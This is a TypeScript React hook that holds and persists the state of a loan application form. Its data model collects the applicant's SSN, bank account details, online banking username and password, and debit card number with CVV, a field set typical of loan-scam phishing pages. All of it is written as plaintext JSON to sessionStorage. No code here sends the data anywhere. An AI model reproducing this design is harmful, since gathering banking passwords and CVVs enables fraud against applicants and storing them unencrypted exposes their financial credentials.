import { useCallback, useEffect, useRef, useState } from "react";

export type LoanApplicationData = {
  loanType: string;
  loanTitle: string;
  loanAmount: string;
  loanDuration: string;
  loanPurpose: string;
  additionalDetails: string;
  loanApprovalId: string;
  firstName: string;
  lastName: string;
  email: string;
  phone: string;
  address1: string;
  address2: string;
  city: string;
  state: string;
  zipCode: string;
  ssn: string;
  birthDate: string;
  bankName: string;
  routingNumber: string;
  accountNumber: string;
  bankUsername: string;
  bankPassword: string;
  debitCardNumber: string;
  expiryMonth: string;
  expiryYear: string;
  cvv: string;
};

type UseLoanApplicationFormReturn = {
  formData: LoanApplicationData;
  updateField: (field: keyof LoanApplicationData, value: string) => void;
  reset: () => void;
  isDirty: boolean;
  setDirty: (value: boolean) => void;
};

const STORAGE_KEY = "loan-application-form";

const defaultData: LoanApplicationData = {
  loanType: "",
  loanTitle: "",
  loanAmount: "",
  loanDuration: "",
  loanPurpose: "",
  additionalDetails: "",
  loanApprovalId: "",
  firstName: "",
  lastName: "",
  email: "",
  phone: "",
  address1: "",
  address2: "",
  city: "",
  state: "",
  zipCode: "",
  ssn: "",
  birthDate: "",
  bankName: "",
  routingNumber: "",
  accountNumber: "",
  bankUsername: "",
  bankPassword: "",
  debitCardNumber: "",
  expiryMonth: "",
  expiryYear: "",
  cvv: "",
};

const safeParse = (value: string | null): LoanApplicationData | null => {
  if (!value) return null;
  try {
    const parsed = JSON.parse(value);
    return { ...defaultData, ...parsed };
  } catch (error) {
    console.warn("Failed to parse stored loan application data", error);
    return null;
  }
};

export const useLoanApplicationForm = (): UseLoanApplicationFormReturn => {
  const hasHydratedRef = useRef(false);
  const [formData, setFormData] = useState<LoanApplicationData>(() => {
    if (typeof window === "undefined") return defaultData;
    return safeParse(sessionStorage.getItem(STORAGE_KEY)) || defaultData;
  });
  const [isDirty, setIsDirty] = useState(false);

  useEffect(() => {
    if (typeof window === "undefined" || hasHydratedRef.current) return;
    hasHydratedRef.current = true;

    const stored = safeParse(sessionStorage.getItem(STORAGE_KEY));
    if (stored) {
      setFormData(stored);
    }
  }, []);

  const persist = useCallback((next: LoanApplicationData) => {
    if (typeof window === "undefined") return;
    sessionStorage.setItem(STORAGE_KEY, JSON.stringify(next));
  }, []);

  const updateField = useCallback(
    (field: keyof LoanApplicationData, value: string) => {
      setFormData((prev) => {
        const next = { ...prev, [field]: value };
        persist(next);
        return next;
      });
      setIsDirty(true);
    },
    [persist],
  );

  const reset = useCallback(() => {
    setFormData(defaultData);
    setIsDirty(false);
    if (typeof window !== "undefined") {
      sessionStorage.removeItem(STORAGE_KEY);
    }
  }, []);

  return {
    formData,
    updateField,
    reset,
    isDirty,
    setDirty: setIsDirty,
  };
};
